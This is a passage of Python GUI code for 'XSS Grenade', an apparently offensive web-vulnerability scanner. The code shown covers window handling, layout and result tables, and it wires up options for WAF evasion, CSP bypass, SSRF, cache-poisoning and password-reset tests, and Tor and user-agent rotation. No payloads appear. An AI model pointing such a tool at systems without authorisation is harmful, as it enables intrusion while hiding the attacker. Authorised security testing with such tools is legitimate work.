            # ── v5/v6/v7: nové detection fáze ──
            headless_verify=cfg.get("headless_verify", False),
            dom_v6_taint=cfg.get("dom_v6_taint", False),
            static_js=cfg.get("static_js", False),
            enable_sourcemap=cfg.get("sourcemap", False),
            trusted_types=cfg.get("trusted_types", False),
            stored_roundtrip=cfg.get("stored_roundtrip", False),
            proto_pollution=cfg.get("proto_pollution", False),
            dom_clobbering=cfg.get("dom_clobbering", False),
            ssr_hydration=cfg.get("ssr_hydration", False),
            csp_bypass=cfg.get("csp_bypass", False),
            adaptive_waf=cfg.get("adaptive_waf", False),
            open_redirect=cfg.get("open_redirect", False),
            param_wordlist=cfg.get("param_wordlist", False),
            auth_cookies=cfg.get("auth_cookies", ""),  # v10.15: cookie injection
            # v10.15: SSRF — opt-in jako destructive, vyžaduje autorizaci
            # přes warning dialog v _handle_ssrf_checkbox_click.
            ssrf_scan_enabled=cfg.get("ssrf_scan_enabled", False),
            # v10.14: Destructive testing — vyžaduje explicitní autorizaci
            # přes warning dialog v _handle_destructive_checkbox_click.
            # Pokud True, run_scan spustí Cache Poisoning + Host Header
            # password reset + Stored XSS via headers fáze.
            destructive_enabled=cfg.get("destructive_enabled", False),
            destructive_test_email=cfg.get("destructive_test_email", None),
            # Tor + UA rotation parametry
            tor_rotate_every=cfg.get("tor_rotate_every", 0),
            tor_isolate_workers=cfg.get("tor_isolate_workers", False),
            ua_rotate_every=cfg.get("ua_rotate_every", 5),
            gui_mode=True,
            cancel_event=self.cancel_event,
        )
        self.sig_finished.emit(results or [], time.time() - t0)


# ══════════════════════════════════════════════════════════════════════
# HLAVNÍ OKNO  1920 × 1080
# ══════════════════════════════════════════════════════════════════════

class XSSGrenadeGUI(QMainWindow):

    LEFT_W = 360

    def __init__(self):
        super().__init__()
        self.worker     = None
        self.hit_count  = 0
        self.start_time = None
        self._stopping  = False   # True between Stop click and the worker truly ending
        self._force_ready = False # True once Stop was pressed once → next press force-kills
        self._collected_hits = [] # raw finding dicts, so Save works even mid-scan / after a force stop
        # Debug log soubor vedle xss_grenade_gui.py. OFF by default: bez tohoto
        # gate se log otevíral a plnil při každém GUI běhu (poll každých 80 ms).
        # Nastav XSSG_DEBUG_GUI=1 pro reálný log; jinak jde vše do os.devnull a
        # všechna self._dbg.write / _dbg_log volání jsou no-op (žádný rostoucí soubor).
        self._dbg_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "xss_debug_gui.log")
        _dbg_target = self._dbg_path if os.environ.get("XSSG_DEBUG_GUI") == "1" else os.devnull
        self._dbg = open(_dbg_target, "w", encoding="utf-8")
        self._dbg.write(f"=== XSS Grenade GUI Debug Log ===\n")
        self._dbg.flush()
        self.setWindowTitle("XSS Grenade")
        # v10.9: Window is now resizable. Initial size 1920×1080 (4K-friendly),
        # minimum 1280×720 (HD floor — below this layout breaks).
        self.resize(1920, 1080)
        self.setMinimumSize(1280, 720)
        # v10.80: frameless main window with a themed title bar integrated into
        # the app top-bar (no separate native chrome in a clashing style). Native
        # move/resize/snap/maximize are preserved via WM_NCHITTEST + a taskbar-
        # aware WM_GETMINMAXINFO handler (see nativeEvent). Windows-only; every
        # other platform keeps its native frame. All native handling is guarded
        # so a failure degrades gracefully instead of breaking the window.
        self._frameless = (sys.platform == "win32")
        self._resize_border = 6
        if self._frameless:
            self.setWindowFlags(Qt.Window | Qt.FramelessWindowHint)
        self._build_ui()
        self._retheme_legacy()   # de-hardcode legacy dark-mode grays for the active palette
        self._timer = QTimer()
        self._timer.timeout.connect(self._tick)
        self._poll_timer = QTimer()
        self._poll_timer.timeout.connect(self._poll_queues)
        self._poll_timer.start(80)

    # ── Frameless-window native handling (Windows) ─────────────────────
    def changeEvent(self, e):
        super().changeEvent(e)
        try:
            from PyQt5.QtCore import QEvent
            if (e.type() == QEvent.WindowStateChange
                    and getattr(self, "_frameless", False)
                    and hasattr(self, "btn_win_max")):
                self.btn_win_max.setText("❐" if self.isMaximized() else "□")
        except Exception:
            pass

    def nativeEvent(self, eventType, message):
        # Keep native move / edge-resize / aero-snap / taskbar-aware maximize even
        # though the window is frameless. Fully guarded — any failure falls back
        # to the default handling instead of breaking the window.
        if getattr(self, "_frameless", False) and eventType == "windows_generic_MSG":
            try:
                import ctypes
                from ctypes import wintypes
                from PyQt5.QtCore import QPoint
                msg = wintypes.MSG.from_address(int(message))

                if msg.message == 0x0084:            # WM_NCHITTEST
                    gx = ctypes.c_short(msg.lParam & 0xFFFF).value
                    gy = ctypes.c_short((msg.lParam >> 16) & 0xFFFF).value
                    pos = self.mapFromGlobal(QPoint(gx, gy))
                    x, y, w, h = pos.x(), pos.y(), self.width(), self.height()
                    b = self._resize_border
                    if not self.isMaximized():
                        L, R, T, B = x < b, x > w - b, y < b, y > h - b
                        if T and L: return True, 13   # HTTOPLEFT
                        if T and R: return True, 14   # HTTOPRIGHT
                        if B and L: return True, 16   # HTBOTTOMLEFT
                        if B and R: return True, 17   # HTBOTTOMRIGHT
                        if L: return True, 10         # HTLEFT
                        if R: return True, 11         # HTRIGHT
                        if T: return True, 12         # HTTOP
                        if B: return True, 15         # HTBOTTOM
                    # drag "caption": inside the top-bar and not over a control
                    tb = getattr(self, "_titlebar_widget", None)
                    if tb is not None:
                        top = tb.mapTo(self, QPoint(0, 0)).y()
                        if top <= y <= top + tb.height():
                            child = self.childAt(pos)
                            if (child is None or child is tb
                                    or child is getattr(self, "_wordmark", None)):
                                return True, 2        # HTCAPTION
                    return True, 1                    # HTCLIENT

                if msg.message == 0x0024:            # WM_GETMINMAXINFO
                    # make native maximize respect the work area (taskbar)
                    monitor = ctypes.windll.user32.MonitorFromWindow(
                        int(self.winId()), 2)         # MONITOR_DEFAULTTONEAREST
                    if monitor:
                        class MONITORINFO(ctypes.Structure):
                            _fields_ = [("cbSize", wintypes.DWORD),
                                        ("rcMonitor", wintypes.RECT),
                                        ("rcWork", wintypes.RECT),
                                        ("dwFlags", wintypes.DWORD)]
                        mi = MONITORINFO(); mi.cbSize = ctypes.sizeof(MONITORINFO)
                        ctypes.windll.user32.GetMonitorInfoW(monitor, ctypes.byref(mi))
                        work, mon = mi.rcWork, mi.rcMonitor

                        class MINMAXINFO(ctypes.Structure):
                            _fields_ = [("ptReserved", wintypes.POINT),
                                        ("ptMaxSize", wintypes.POINT),
                                        ("ptMaxPosition", wintypes.POINT),
                                        ("ptMinTrackSize", wintypes.POINT),
                                        ("ptMaxTrackSize", wintypes.POINT)]
                        mmi = MINMAXINFO.from_address(msg.lParam)
                        mmi.ptMaxSize.x = work.right - work.left
                        mmi.ptMaxSize.y = work.bottom - work.top
                        mmi.ptMaxPosition.x = work.left - mon.left
                        mmi.ptMaxPosition.y = work.top - mon.top
                        mmi.ptMinTrackSize.x = self.minimumWidth()
                        mmi.ptMinTrackSize.y = self.minimumHeight()
                        return True, 0
            except Exception:
                pass
        return super().nativeEvent(eventType, message)

    # ── Root layout ───────────────────────────────────────────────────

    def _build_ui(self):
        root = QWidget(); self.setCentralWidget(root)
        outer = QVBoxLayout(root)
        outer.setContentsMargins(0, 0, 0, 0); outer.setSpacing(0)
        # v10.81: full-width CAPTION strip (wordmark + window controls only) —
        # this is the frameless drag bar. Everything else lives in a padded body
        # underneath it, so the top of the app reads like a real title bar.
        outer.addWidget(self._titlebar())

        body_wrap = QWidget()
        ov = QVBoxLayout(body_wrap)
        ov.setContentsMargins(18, 12, 18, 12); ov.setSpacing(10)
        ov.addWidget(self._actionbar())        # target URL + RUN / STOP / SAVE
        ov.addWidget(self._statbar())
        # progress bar — pod findings/time/remain/status
        self.pb = QProgressBar()
        self.pb.setFixedHeight(18)
        self.pb.setFixedWidth(410)
        self.pb.setTextVisible(True)
        self.pb.setFormat("%p%")
        self.pb.setAlignment(Qt.AlignCenter)
        pb_row = QHBoxLayout(); pb_row.setContentsMargins(0, 0, 0, 0)
        pb_row.addWidget(self.pb)
        pb_row.addStretch(1)
        ov.addLayout(pb_row)
        ov.addWidget(self._hdiv())
        # tělo: sidebar (telemetrie) | obsah (taby)
        body = QHBoxLayout(); body.setContentsMargins(0, 0, 0, 0); body.setSpacing(14)
        body.addWidget(self._left_panel(),  stretch=0)
        body.addWidget(self._right_panel(), stretch=1)
        ov.addLayout(body, 1)
        outer.addWidget(body_wrap, 1)

        self.sb = QStatusBar(); self.setStatusBar(self.sb)
        self.sb.showMessage("READY")

    # ── LEFT PANEL ────────────────────────────────────────────────────

    def _left_panel(self) -> QWidget:
        # v10.9: Left panel is now resizable. Default LEFT_W=560 used as
        # minimum (below this attack graph nodes overlap). Maximum 720 so
        # the panel doesn't dominate when window is wide.
        # v10.14: Rebuilt — about content lives in a QScrollArea so it
        # never clips on short windows, every text item word-wraps so
        # long lines (Proto Pollution CVE feed, repo URL) stay readable,
        # and sections render as subtle cards for a cleaner modern look.
        p = QWidget(); p.setObjectName("left_panel")
        p.setMinimumWidth(self.LEFT_W)
        p.setMaximumWidth(720)
        v = QVBoxLayout(p); v.setContentsMargins(0, 0, 0, 0); v.setSpacing(0)

        # ── Telemetrie (pod stat řádkem): 2×2 dlaždice + progress s % ──
        graph_wrap = QWidget()
        gv = QVBoxLayout(graph_wrap)
        gv.setContentsMargins(2, 2, 8, 8); gv.setSpacing(12)

        # 2×2 dlaždice počítadel (paths/params/hits/waf)
        tiles = QWidget()
        tg = QGridLayout(tiles)
        tg.setContentsMargins(0, 0, 0, 0); tg.setHorizontalSpacing(10); tg.setVerticalSpacing(10)
        self._tile_paths  = self._tele_tile("PATHS")
        self._tile_params = self._tele_tile("PARAMS")
        self._tile_hits   = self._tele_tile("HITS")
        self._tile_waf    = self._tele_tile("WAF")
        tg.addWidget(self._tile_paths,  0, 0)
        tg.addWidget(self._tile_params, 0, 1)
        tg.addWidget(self._tile_hits,   1, 0)
        tg.addWidget(self._tile_waf,    1, 1)
        gv.addWidget(tiles)

        # attack graph (vyplní zbytek prostoru pod telemetrií). The "expand to
        # full window" control now lives INSIDE the graph as a top-right overlay
        # (see AttackGraphWidget), so there is no separate header bar above it.
        self._attack_graph = AttackGraphWidget(font_size=11, speed_ms=55)
        self._attack_graph.setMinimumHeight(220)
        self._attack_graph.sig_hit_clicked.connect(
            self._show_vulnerability_dialog)
        self._attack_graph.sig_expand_clicked.connect(self._expand_attack_graph)
        self.btn_ag_expand = self._attack_graph._btn_expand   # back-compat alias
        gv.addWidget(self._attack_graph, 1)
        # remembered so _expand can pull the live widget out to a full-window
        # dialog and put it right back when closed
        self._ag_graph_layout = gv
        self._ag_dialog = None

        v.addWidget(graph_wrap, 1)
        # Alias pro zpětnou kompatibilitu
        self._matrix = self._attack_graph


        # ── Fixed footer (word-wraps; never clips on narrow panel) ──
        footer = QWidget(); footer.setObjectName("left_footer")
        fv = QVBoxLayout(footer)
        fv.setContentsMargins(26, 8, 26, 14); fv.setSpacing(0)
        fv.addWidget(self._ldiv())
        fv.addSpacing(8)
        foot = QLabel(
            "TX-C0RE Security Research  ·  github.com/tx-c0re")
        foot.setStyleSheet("color:#888888; font-size:10px;")
        foot.setWordWrap(True)
        fv.addWidget(foot)
        v.addWidget(footer)
        return p

    def _ldiv(self):
        f = QFrame()
        f.setObjectName("left_div")
        f.setFrameShape(QFrame.HLine)
        f.setFixedHeight(1)
        return f

    def _hdiv(self):
        f = QFrame()
        f.setObjectName("h_divider")
        f.setFrameShape(QFrame.HLine)
        f.setFixedHeight(1)
        return f

    # ── RIGHT PANEL ───────────────────────────────────────────────────

    def _right_panel(self) -> QWidget:
        p = QWidget()
        p.setObjectName("right_panel")

        v = QVBoxLayout(p)
        v.setContentsMargins(0, 0, 0, 0)
        v.setSpacing(8)

        v.addWidget(self._tabs(), stretch=1)

        return p

    def _titlebar(self) -> QWidget:
        """v10.81: full-width CAPTION strip — ONLY the wordmark + window controls.
        This is the frameless drag bar (see nativeEvent); the target URL and the
        RUN/STOP/SAVE controls now live one row below in _actionbar()."""
        w = QWidget(); w.setObjectName("title_bar")
        w.setFixedHeight(40)
        w.setAttribute(Qt.WA_StyledBackground, True)
        w.setStyleSheet(
            f"QWidget#title_bar {{ background: {theme('bg_header')}; "
            f"border-bottom: 1px solid {theme('border')}; }}")
        h = QHBoxLayout(w)
        h.setContentsMargins(18, 0, 8, 0)
        h.setSpacing(10)

        wm = QLabel("XSS GRENADE")
        wm.setObjectName("brand_compact")
        h.addWidget(wm)
        h.addStretch(1)

        # window controls (min / max / close) — only when frameless
        if getattr(self, "_frameless", False):
            self.btn_win_min = self._win_ctl_btn("–", self.showMinimized)      # –
            self.btn_win_max = self._win_ctl_btn("□", self._toggle_max_restore)  # ▢
            self.btn_win_close = self._win_ctl_btn("✕", self.close, close=True)  # ✕
            for b in (self.btn_win_min, self.btn_win_max, self.btn_win_close):
                h.addWidget(b)

        self._titlebar_widget = w
        self._wordmark = wm
        return w

    def _actionbar(self) -> QWidget:
        """v10.81: row 2 — target URL + RUN / STOP / SAVE, modernized with a soft
        drop-shadow (subtle 3D lift) on the action buttons."""
        from PyQt5.QtWidgets import QGraphicsDropShadowEffect
        w = QWidget()
        h = QHBoxLayout(w)
        h.setContentsMargins(0, 0, 0, 0)
        h.setSpacing(12)

        self.inp_target = QLineEdit()
        self.inp_target.setMinimumHeight(40)
        self.inp_target.setPlaceholderText("target URL…")
        self.inp_target.returnPressed.connect(self._start)

        self.btn_start = QPushButton("▶  RUN")
        self.btn_start.setObjectName("btn_start")
        self.btn_start.clicked.connect(self._start)

        self.btn_stop = QPushButton("■  STOP")
        self.btn_stop.setObjectName("btn_stop")
        self.btn_stop.setEnabled(False)
        self.btn_stop.clicked.connect(self._stop)

        # v10.59: Save findings anytime (mid-scan, or after a Stop) — so a slow /
        # forced stop never loses what was already found.
        self.btn_save = QPushButton("\U0001F4BE  SAVE")
        self.btn_save.setObjectName("btn_save")
        self.btn_save.setToolTip(
            "Save the findings collected so far to a JSON + HTML report + PoC "
            "bundle. Works anytime — even during a scan or a slow Stop, so you "
            "never lose findings.")
        self.btn_save.clicked.connect(self._save_findings)

        # soft 3D lift on the action buttons (modern raised look)
        for _b in (self.btn_start, self.btn_stop, self.btn_save):
            _b.setMinimumHeight(40)
            _b.setCursor(Qt.PointingHandCursor)
            _sh = QGraphicsDropShadowEffect(_b)
            _sh.setBlurRadius(18)
            _sh.setXOffset(0)
            _sh.setYOffset(3)
            _sh.setColor(QColor(0, 0, 0, 90))
            _b.setGraphicsEffect(_sh)

        h.addWidget(self.inp_target, 1)
        h.addWidget(self.btn_start)
        h.addWidget(self.btn_stop)
        h.addWidget(self.btn_save)
        return w

    def _win_ctl_btn(self, glyph, slot, close=False):
        """A themed window-control button (min/max/close) for the frameless bar."""
        b = QPushButton(glyph)
        b.setObjectName("win_close" if close else "win_ctl")
        b.setFixedSize(34, 26)
        b.setCursor(Qt.PointingHandCursor)
        b.setFocusPolicy(Qt.NoFocus)
        b.clicked.connect(slot)
        hov = theme('accent') if close else theme('bg_btn_hover')
        hfg = "#ffffff" if close else theme('fg_strong')
        b.setStyleSheet(
            f"QPushButton{{background:transparent; color:{theme('fg_muted')}; "
            f"border:none; font-size:13px; border-radius:5px; padding:0;}}"
            f"QPushButton:hover{{background:{hov}; color:{hfg};}}")
        return b

    def _toggle_max_restore(self):
        if self.isMaximized():
            self.showNormal()
        else:
            self.showMaximized()
        if hasattr(self, "btn_win_max"):
            self.btn_win_max.setText("❐" if self.isMaximized() else "□")  # ❐ / ▢

    def _statbar(self) -> QWidget:
        """v10.30: tenký řádek se stat chipy (findings/time/remain/status)
        místo čtyř velkých karet."""
        w = QWidget()
        h = QHBoxLayout(w)
        h.setContentsMargins(0, 0, 0, 0)
        h.setSpacing(8)

        self._c_hits    = self._stat_chip("findings", "0")
        self._c_elapsed = self._stat_chip("time",     "0s")
        self._c_eta     = self._stat_chip("remain",   "--:--")
        self._c_status  = self._stat_chip("status",   "IDLE", status=True)

        for c in (self._c_hits, self._c_elapsed, self._c_eta, self._c_status):
            h.addWidget(c)
        h.addStretch()
        return w

    def _stat_chip(self, title, value, status=False):
        """Kompaktní inline chip: hodnota (akcent) + popisek (muted).
        Zachovává ._val pro běhové aktualizace (self._c_*._val.setText())."""
        w = QWidget()
        w.setObjectName("stat_chip")
        w.setAttribute(Qt.WA_StyledBackground, True)
        h = QHBoxLayout(w)
        h.setContentsMargins(12, 5, 12, 5)
        h.setSpacing(7)

        vl = QLabel(value)
        vl.setObjectName("chip_status" if status else "chip_value")
        tl = QLabel(title)
        tl.setObjectName("chip_title")

        h.addWidget(vl)
        h.addWidget(tl)
        w._val = vl
        return w

    def _tele_tile(self, title):
        """Dlaždice počítadla v levé telemetrii (hodnota + popisek)."""
        w = QWidget()
        w.setObjectName("tele_tile")
        w.setAttribute(Qt.WA_StyledBackground, True)
        vv = QVBoxLayout(w)
        vv.setContentsMargins(12, 8, 12, 8); vv.setSpacing(2)
        val = QLabel("0"); val.setObjectName("tele_value")
        ttl = QLabel(title); ttl.setObjectName("tele_title")
        vv.addWidget(val); vv.addWidget(ttl)
        w._val = val
        return w

    def _refresh_telemetry_tiles(self):
        """Zrcadlí počty z attack grafu do dlaždic (paths/params/hits/waf)."""
        g = getattr(self, "_attack_graph", None)
        if g is None:
            return
        try:
            self._tile_paths._val.setText(str(g._path_count))
            self._tile_params._val.setText(str(g._param_count))
            self._tile_hits._val.setText(str(g._hit_count))
            self._tile_waf._val.setText(str(g._waf_count))
        except Exception:
            pass

    def _rhead_legacy(self) -> QWidget:
        w = QWidget()
        h = QHBoxLayout(w)
        h.setContentsMargins(0, 0, 0, 0)

        lv = QVBoxLayout()
        lv.setSpacing(4)

        t = QLabel("XSS  GRENADE")
        t.setObjectName("brand_wordmark")

        s = QLabel("OFFENSIVE SECURITY RESEARCH  •  TX-C0RE")
        s.setObjectName("brand_subtitle")

        lv.addWidget(t)
        lv.addWidget(s)

        h.addLayout(lv)
        h.addStretch()

        self._c_hits    = self._scard("FINDINGS", "0")
        self._c_elapsed = self._scard("TIME",    "0s")
        self._c_eta     = self._scard("REMAIN",  "--:--")
        self._c_status  = self._scard("STATUS", "IDLE", wide=True)

        for c in (self._c_hits, self._c_elapsed, self._c_eta, self._c_status):
            h.addWidget(c)
            h.addSpacing(10)

        return w


    def _scard(self, title, value, wide=False):
        w = QWidget()
        w.setObjectName("stat_card")
        w.setAttribute(Qt.WA_StyledBackground, True)
        w.setFixedWidth(150 if wide else 120)

        v = QVBoxLayout(w)
        v.setContentsMargins(10, 8, 10, 8)

        vl = QLabel(value)
        vl.setObjectName("stat_value")
        vl.setAlignment(Qt.AlignCenter)
        vl.setWordWrap(True)

        tl = QLabel(title)
        tl.setObjectName("stat_title")
        tl.setAlignment(Qt.AlignCenter)

        v.addWidget(vl)
        v.addWidget(tl)

        w._val = vl
        return w


    def _target_bar(self) -> QWidget:
        w = QWidget()
        v = QVBoxLayout(w)

        row = QHBoxLayout()

        lbl = QLabel("TARGET")
        lbl.setStyleSheet(f"color:{theme('fg_muted')}; font-size:11px; letter-spacing:3px;")
        lbl.setFixedWidth(70)

        self.inp_target = QLineEdit()
        self.inp_target.setMinimumHeight(36)

        self.btn_start = QPushButton(">  RUN")
        self.btn_start.setObjectName("btn_start")
        self.btn_start.clicked.connect(self._start)

        self.btn_stop = QPushButton("[]  STOP")
        self.btn_stop.setObjectName("btn_stop")
        self.btn_stop.setEnabled(False)
        self.btn_stop.clicked.connect(self._stop)

        row.addWidget(lbl)
        row.addWidget(self.inp_target)
        row.addWidget(self.btn_start)
        row.addWidget(self.btn_stop)

        self.pb = QProgressBar()
        self.pb.setFixedHeight(16)

        v.addLayout(row)
        v.addWidget(self.pb)

        return w


    def _tabs(self) -> QTabWidget:
        self.tabs = QTabWidget()
        self.tabs.setDocumentMode(True)
        # v10.81: document mode draws a full-width "base line" across the tab bar
        # (visible as a stray light line to the right of the last tab). It adds
        # nothing — the selected tab already has its accent underline — so drop it.
        self.tabs.tabBar().setDrawBase(False)

        self.tabs.addTab(self._t_scan(),    "SCAN")
        self.tabs.addTab(self._t_crawler(), "CRAWLER")
        self.tabs.addTab(self._t_csp(),     "CSP")
        self.tabs.addTab(self._t_results(), "RESULTS")
        # v10.8: Library Audit tab — routes static-js findings from vendor
        # libraries (jQuery, lodash, etc.) here instead of polluting RESULTS
        self.tabs.addTab(self._t_library_audit(),  "LIBRARY AUDIT")
        self._tab_idx_library_audit = self.tabs.count() - 1
        self.tabs.addTab(self._t_config(),  "SETTINGS")
        self.tabs.addTab(self._t_help(),    "HELP")

        return self.tabs

    # ── Tab builders ──────────────────────────────────────────────────

    def _t_scan(self):
        w = QWidget(); v = QVBoxLayout(w); v.setContentsMargins(0,6,0,0)
        lbl = QLabel("LIVE OUTPUT"); lbl.setStyleSheet("color:#808080; font-size:9px; letter-spacing:3px; padding-left:6px; font-weight:bold;")
        self.log_out = QTextEdit(); self.log_out.setReadOnly(True)
        # v10.15: strop na počet řádků — bez něj QTextEdit roste neomezeně
        # a po dlouhém běhu (hodiny, verbose) GUI začne sekat na každém
        # append (přepočet layoutu obřího dokumentu). 5000 řádků = kruhový
        # buffer; nejstarší se zahazují, scan tím není nijak ovlivněn.
        self.log_out.document().setMaximumBlockCount(5000)
        v.addWidget(lbl); v.addWidget(self.log_out, 1); return w

    def _t_crawler(self):
        w = QWidget(); v = QVBoxLayout(w); v.setContentsMargins(0,6,0,0); v.setSpacing(8)
        sr = QHBoxLayout(); sr.setContentsMargins(4,0,4,0)
        self._cp = self._mstat("PAGES","0"); self._cpar = self._mstat("PARAMETERS","0")
        self._ce = self._mstat("ERRORS","0");   self._cr = self._mstat("STR/S","0.0")
        for s in (self._cp, self._cpar, self._ce, self._cr): sr.addWidget(s)
        sr.addStretch(); v.addLayout(sr)
        # v10.16: crawl nemá známý celkový počet stránek dopředu (max_pages
        # je strop, ne cíl), takže pevné procento bylo zavádějící — na malém
        # webu ukazovalo ~2 % a vypadalo zaseknuté. Použijeme busy/neurčitý
        # indikátor, který běží dokud crawl běží, a vyplní se na 100 % na konci.
        cpb_row = QHBoxLayout(); cpb_row.setContentsMargins(6, 0, 6, 0); cpb_row.setSpacing(8)
        self.cpb_lbl = QLabel("IDLE")
        self.cpb_lbl.setStyleSheet("color:#808080; font-size:9px; letter-spacing:2px; font-weight:bold;")
        self.cpb_lbl.setFixedWidth(132)
        self.cpb = QProgressBar()
        self.cpb.setRange(0, 100); self.cpb.setValue(0)
        self.cpb.setFixedHeight(6)
        self.cpb.setTextVisible(False)
        cpb_row.addWidget(self.cpb_lbl); cpb_row.addWidget(self.cpb, 1)
        v.addLayout(cpb_row)
        lbl = QLabel("LOG"); lbl.setStyleSheet("color:#808080; font-size:9px; letter-spacing:3px; padding-left:6px; font-weight:bold;")
        self.clog = QTextEdit(); self.clog.setReadOnly(True)
        self.clog.document().setMaximumBlockCount(5000)  # v10.15: viz log_out
        v.addWidget(lbl); v.addWidget(self.clog, 1); return w

    def _mstat(self, title, value):
        w = QWidget(); w.setObjectName("mstat_card"); w.setAttribute(Qt.WA_StyledBackground, True); w.setFixedWidth(110)
        v = QVBoxLayout(w); v.setContentsMargins(8,6,8,6); v.setSpacing(2)
        vl = QLabel(value); vl.setObjectName("mstat_value"); vl.setAlignment(Qt.AlignCenter)
        tl = QLabel(title); tl.setObjectName("mstat_title"); tl.setAlignment(Qt.AlignCenter)
        v.addWidget(vl); v.addWidget(tl); w._val = vl; return w

    def _t_csp(self):
        w = QWidget(); v = QVBoxLayout(w); v.setContentsMargins(6,10,6,6); v.setSpacing(10)
        sr = QHBoxLayout()
        self.csp_score = QLabel("—"); self.csp_score.setStyleSheet("font-size:42px; font-weight:bold; color:#808080;")
        self.csp_note  = QLabel("Waiting for scan..."); self.csp_note.setStyleSheet("color:#b0b0b0; font-size:13px;")
        sr.addWidget(self.csp_score); sr.addSpacing(16); sr.addWidget(self.csp_note); sr.addStretch()
        v.addLayout(sr); v.addWidget(self._hdiv())
        lbl_r = QLabel("RAW CSP HEADER"); lbl_r.setStyleSheet("color:#808080; font-size:9px; letter-spacing:3px; font-weight:bold;"); v.addWidget(lbl_r)
        self.csp_raw = QTextEdit(); self.csp_raw.setReadOnly(True); self.csp_raw.setMaximumHeight(46); self.csp_raw.setStyleSheet("color:#b0b0b0; font-size:10px; border:none; border-top:1px solid #1a1a1a;"); v.addWidget(self.csp_raw)
        lbl_f = QLabel("FINDINGS"); lbl_f.setStyleSheet("color:#808080; font-size:9px; letter-spacing:3px; font-weight:bold;"); v.addWidget(lbl_f)
        self.csp_tbl = QTableWidget(0, 5)
        self.csp_tbl.setHorizontalHeaderLabels(["Severity", "Directive", "Name", "Detail", "Bypass hint"])
        hdr = self.csp_tbl.horizontalHeader()
        hdr.setSectionResizeMode(0, QHeaderView.ResizeToContents)
        hdr.setSectionResizeMode(1, QHeaderView.ResizeToContents)
        hdr.setSectionResizeMode(2, QHeaderView.Interactive); self.csp_tbl.setColumnWidth(2, 220)
        hdr.setSectionResizeMode(3, QHeaderView.Stretch)
        hdr.setSectionResizeMode(4, QHeaderView.Stretch)
        self.csp_tbl.setEditTriggers(QTableWidget.NoEditTriggers)
        self.csp_tbl.verticalHeader().setVisible(False)
        self.csp_tbl.setAlternatingRowColors(True)
        self.csp_tbl.setWordWrap(True)
        v.addWidget(self.csp_tbl, 1)

        # Bypass vektory a doporučení
        lbl_bp = QLabel("BYPASS VECTORS & RECOMMENDATIONS"); lbl_bp.setStyleSheet("color:#808080; font-size:9px; letter-spacing:3px; font-weight:bold; margin-top:6px;"); v.addWidget(lbl_bp)
        self.csp_extra = QTextEdit(); self.csp_extra.setReadOnly(True); self.csp_extra.setMaximumHeight(100)
        self.csp_extra.setStyleSheet("color:#b0b0b0; font-size:10px; border:none; border-top:1px solid #1a1a1a;")
        v.addWidget(self.csp_extra)
        return w

    def _t_results(self):
        w = QWidget(); v = QVBoxLayout(w); v.setContentsMargins(0,6,0,0)
        # 11 sloupců (v10.11+, v10.12 renamed CVE → CWE/CVE):
        # URL | Parametr | Kontext | Klasa | CWE/CVE | Probe | Zdroj | Status | WAF | CSP | Payload
        # CWE/CVE sloupec: CVE pro known vulnerabilities, CWE číslo pro generic
        # findings (CWE-79 = XSS, CWE-1321 = Prototype Pollution, etc.).
        self.res_tbl = QTableWidget(0, 11)
        self.res_tbl.setHorizontalHeaderLabels([
            "URL", "Parameter", "Context", "Class", "CWE / CVE", "Probe",
            "Source", "Status", "WAF", "CSP", "Payload"
        ])
        hdr = self.res_tbl.horizontalHeader()
        # ── DŮLEŽITÉ: Interactive (uživatel může táhnout) místo Stretch
        # (auto-resize do viewport šířky). Stretch nutí všechny sloupce
        # vejít se na obrazovku → headers se ořezávají na "JRl", "rl…",
        # když máme nové fáze (postMessage/websocket/mutation/static-js/TT)
        # se širokými hodnotami. Interactive + setColumnWidth + horizontal
        # scrollbar řeší obojí: standardní šířka + možnost rolovat.
        # ─────────────────────────────────────────────────────────────────
        hdr.setSectionResizeMode(QHeaderView.Interactive)
        hdr.setStretchLastSection(False)   # Payload bude mít vlastní šířku
        # Per-column default widths (uživatel může pak přetáhnout)
        col_widths = {
            0: 320,   # URL — dlouhé absolute URLs
            1: 160,   # Parametr — JS:js?id=G-LH49JXVYP6 atd.
            2: 240,   # Kontext — "static-js-taint (high)" atd.
            3: 130,   # Klasa — "TT:default!" atd.
            4: 150,   # CVE — "CVE-2026-41238" atd.
            5: 70,    # Probe — symbol nebo "—"
            6: 130,   # Zdroj — "trusted-types" atd.
            7: 80,    # Status — STATIC/DOM/200/...
            8: 80,    # WAF
            9: 220,   # CSP
            10: 480,  # Payload — hodně dlouhé
        }
        for col, width in col_widths.items():
            self.res_tbl.setColumnWidth(col, width)
        # Povol horizontální scrollbar když součet šířek překročí viewport
        from PyQt5.QtCore import Qt as _Qt
        self.res_tbl.setHorizontalScrollMode(QTableWidget.ScrollPerPixel)
        self.res_tbl.setHorizontalScrollBarPolicy(_Qt.ScrollBarAsNeeded)
        # Aby skrolování bylo plynulé i pro vertikální
        self.res_tbl.setVerticalScrollMode(QTableWidget.ScrollPerPixel)
        self.res_tbl.setEditTriggers(QTableWidget.NoEditTriggers)
        self.res_tbl.verticalHeader().setVisible(False)
        self.res_tbl.setSelectionBehavior(QTableWidget.SelectRows)
        self.res_tbl.setAlternatingRowColors(True)
        self.res_tbl.setWordWrap(False)
        v.addWidget(self.res_tbl); return w

    def _t_library_audit(self):
        """Library Audit tab — vendor library findings (jQuery 3.2.1 sinks etc.)
        routed here instead of polluting RESULTS. Useful for supply chain
        reports without overwhelming the primary view."""
        w = QWidget(); v = QVBoxLayout(w); v.setContentsMargins(0,6,0,0)
        # Info banner
        from PyQt5.QtWidgets import QLabel as _QLabel
        banner = _QLabel(
            "<b>Library Audit</b> — "
            "static-js findings detected in vendor/library code "
            "(jQuery, lodash, react, etc.). These are <b>known sinks in third-party "
            "libraries</b>, not application bugs. Useful for supply chain audits "
            "and 'this app uses vulnerable jQuery 3.2.1' reports. "
            "<i>Severity demoted to info; not counted in primary RESULTS.</i>"
        )
        banner.setObjectName("info_banner")
        banner.setWordWrap(True)
        v.addWidget(banner)

        # 9 columns (v10.11+, v10.12 renamed CVE → CWE/CVE):
        # URL | Library File | Source Pattern | Sink | CWE/CVE |
        # Original Sev | Line | Param | Payload
        self.lib_tbl = QTableWidget(0, 9)
        self.lib_tbl.setHorizontalHeaderLabels([
            "URL", "Library File", "Source Pattern", "Sink", "CWE / CVE",
            "Original Sev", "Line", "Param", "Payload"
        ])
        hdr = self.lib_tbl.horizontalHeader()
        hdr.setSectionResizeMode(QHeaderView.Interactive)
        hdr.setStretchLastSection(False)
        col_widths = {
            0: 320,   # URL of the page
            1: 220,   # Library file (jquery-3.2.1.min.js)
            2: 160,   # Source pattern (location.search etc.)
